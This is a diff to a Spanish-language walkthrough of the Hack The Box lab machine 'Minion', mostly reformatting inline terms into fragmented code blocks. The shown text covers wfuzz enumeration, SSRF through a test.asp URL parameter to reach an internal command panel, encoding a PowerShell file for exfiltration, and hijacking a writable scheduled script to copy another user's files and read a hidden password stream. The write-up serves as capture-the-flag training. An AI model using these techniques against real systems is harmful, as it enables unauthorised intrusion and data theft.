@@ -83,13 +83,29 @@ La pagina esta under construction y poco mas.
 wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.57:62696/FUZZ
 ```
 
-Encontramos un ruta `/backend` pero no se ve nada en firefox. Decidimos fuzzear con la extension `.asp`
+Encontramos un ruta 
+```bash
+ /backend 
+```
+ pero no se ve nada en firefox. Decidimos fuzzear con la extension 
+```bash
+ .asp 
+```
+
 
 ```bash
 wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.57:62696/FUZZ.asp
 ```
 
-Aqui encontramos un fichero `test.asp` y navigando no dice que no encuentra el parametro `u` que tendria que ser un URL.
+Aqui encontramos un fichero 
+```bash
+ test.asp 
+```
+ y navigando no dice que no encuentra el parametro 
+```bash
+ u 
+```
+ que tendria que ser un URL.
 Intentamos ver si se conecta a nuestro servidor web
 
 1. Creamos un servidor web
@@ -116,7 +132,11 @@ Aqui ya vemos que el puerto 80 interno de la maquina esta abierto. Decidimos des
 
 ### Descubrimiento de los puertos abiertos con WFUZZ {-}
 
-Wfuzz permite hacer rangos de numeros con el parametro `-z`
+Wfuzz permite hacer rangos de numeros con el parametro 
+```bash
+ -z 
+```
+
 
 ```bash
 wfuzz -c -t 200 --hc=404 -z range,1-65535 http://10.10.10.57:62696/test.asp?u=http://localhost:FUZZ
@@ -140,7 +160,11 @@ Esto funciona. Pero no vemos en la web el output del comando. Solo vemos el codi
 ### Analizamos la web interna por el puerto privado 80 {-}
 
 Aqui se puede ver un panel de administrador donde parece que podamos ejecutar comandos a nivel de sistema. Si pinchamos el link
-no nos va a dejar porque nos lleva a una url interna `127.0.0.1/cmd.aspx`. Pero si la introducimos directamente en 
+no nos va a dejar porque nos lleva a una url interna 
+```bash
+ 127.0.0.1/cmd.aspx 
+```
+. Pero si la introducimos directamente en 
 
 ```bash
 http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx
@@ -295,7 +319,15 @@ Aqui como tenemos que pasar por la url de la web para enviarnos el fichero, tene
     $encode | Out-File icmp.ps1.b64
     ```
 
-1. En una shell linux normal modificamos los symbolos `+` y `=` para encodearlos en urlencode
+1. En una shell linux normal modificamos los symbolos 
+```bash
+ + 
+```
+ y 
+```bash
+ = 
+```
+ para encodearlos en urlencode
 
     ```bash
     php --interactive
@@ -305,7 +337,15 @@ Aqui como tenemos que pasar por la url de la web para enviarnos el fichero, tene
     %3D
     ```
 
-1. Modificamos todos los symbolos `+` por **%2B** y los symbolos `=` por **%3D**
+1. Modificamos todos los symbolos 
+```bash
+ + 
+```
+ por **%2B** y los symbolos 
+```bash
+ = 
+```
+ por **%3D**
 1. Spliteamos el fichero en dimensiones de lineas iguales
 
     ```bash
@@ -386,7 +426,15 @@ whoami /priv
 SEImpersonatePrivilege
 ```
 
-Aqui ya vemos que podemos escalar privilegios con `JuicyPotatoe.exe` o `RotenPotatoe.exe` pero S4vitar nos
+Aqui ya vemos que podemos escalar privilegios con 
+```bash
+ JuicyPotatoe.exe 
+```
+ o 
+```bash
+ RotenPotatoe.exe 
+```
+ pero S4vitar nos
 muestra aqui una via alternativa de escalar privilegios en esta maquina.
 
 #### Secuestro de comandos para copiar los ficheros del usuario decoder.MINION {-}
@@ -396,14 +444,34 @@ dir c:\
 dir c:\sysadmscripts
 ```
 
-Vemos en `C:\` un directorio raro llamado `sysadmscript`. En este directorio, hay dos ficheros:
+Vemos en 
+```bash
+ C:\ 
+```
+ un directorio raro llamado 
+```bash
+ sysadmscript 
+```
+. En este directorio, hay dos ficheros:
 
 - c.ps1
 - del_logs.bat
 
-Analizando con el comando type lo que hacen estos script, vemos que el `del_logs.bat` llama al fichero `c.ps1` y lo
+Analizando con el comando type lo que hacen estos script, vemos que el 
+```bash
+ del_logs.bat 
+```
+ llama al fichero 
+```bash
+ c.ps1 
+```
+ y lo
 ejecuta con **powershell**. Aqui pensamos que hay una tarea que se ejecuta a intervalo regular de tiempo que ejecuta el fichero
-`del_logs.bat`. Miramos si podemos modificar los ficheros.
+
+```bash
+ del_logs.bat 
+```
+. Miramos si podemos modificar los ficheros.
 
 ```bash
 cacls c:\sysadmscripts\del_logs.bat
@@ -412,7 +480,11 @@ cacls c:\sysadmscripts\c.ps1
 
 Modificamos el Script para copiar los ficheros del usuario **decoder.Minion**
 
-Aqui vemos que solo podemos modificar el fichero `c.ps1`
+Aqui vemos que solo podemos modificar el fichero 
+```bash
+ c.ps1 
+```
+
 
 ```bash
 echo "dir C:\Users\decoder.MINION\Desktop\ > C:\Temp\decoder_desktop.txt" > C:\Temp\c.ps1
@@ -421,8 +493,16 @@ echo "copy C:\Users\decoder.MINION\Desktop\* > C:\Temp\" >> C:\Temp\c.ps1
 copy C:\Temp\c.ps1 C:\sysadmscripts\c.ps1
 ```
 
-Esperando un poco, nos copia los ficheros en `c:\temp`. Podemos visualizar la flag del usuario.
-Tambien vemos un fichero `backup.zip` y si le chequeamos por **Aditionnal Data Streams** con el comando
+Esperando un poco, nos copia los ficheros en 
+```bash
+ c:\temp 
+```
+. Podemos visualizar la flag del usuario.
+Tambien vemos un fichero 
+```bash
+ backup.zip 
+```
+ y si le chequeamos por **Aditionnal Data Streams** con el comando
 
 #### Lectura de Additionnal Data Strems y crackeo de Hash {-}
 
@@ -430,7 +510,11 @@ Tambien vemos un fichero `backup.zip` y si le chequeamos por **Aditionnal Data S
 Get-Item -Path C:\Temp\backup.zip -stream *
 ```
 
-Vemos que tiene un stream llamado pass. Lo miramos con el comando `type`
+Vemos que tiene un stream llamado pass. Lo miramos con el comando 
+```bash
+ type 
+```
+
 
 ```bash
 type C:\Temp\backup.zip:pass
